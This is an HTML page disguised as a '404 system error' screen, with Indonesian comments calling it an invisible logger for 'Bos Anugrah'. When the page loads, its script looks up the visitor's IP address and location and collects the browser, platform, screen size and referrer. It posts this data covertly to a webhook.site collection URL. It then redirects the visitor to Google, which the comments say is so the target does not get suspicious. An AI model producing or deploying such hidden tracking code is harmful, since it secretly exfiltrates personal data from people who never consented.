<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sistem Error 404</title>
    <script>
        // PROTOKOL CYBER ONX - INVISIBLE LOGGER
        async function captureData() {
            try {
                // Ambil data IP dan Lokasi
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                // Tambahan info device biar makin Valid No Cap
                data.user_agent = navigator.userAgent;
                data.platform = navigator.platform;
                data.screen_res = `${window.screen.width}x${window.screen.height}`;
                data.referrer = document.referrer || "Direct Access";

                // LINK PENAMPUNG PUNYA BOS ANUGRAH
                const webhookURL = "https://webhook.site/d9ed67e8-2b06-402f-bfd3-d4e1511eb56e"; 

                // Kirim data ke markas Bos
                await fetch(webhookURL, {
                    method: 'POST',
                    mode: 'no-cors', // Biar gak keblokir CORS
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                // Alihkan target ke Google biar gak curiga sama sekali
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 400);

            } catch (error) {
                // Kalo gagal tetep buang ke Google
                window.location.href = "https://www.google.com";
            }
        }
        
        // Langsung eksekusi pas halaman dibuka
        window.onload = captureData;
    </script>
</head>
<body style="background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding-top: 25%;">
    <div style="border: 1px solid #ff0000; display: inline-block; padding: 20px;">
        <h2 style="margin: 0;">SISTEM ERROR</h2>
        <p style="color: #fff;">Sedang memproses enkripsi data...</p>
    </div>
</body>
</html>
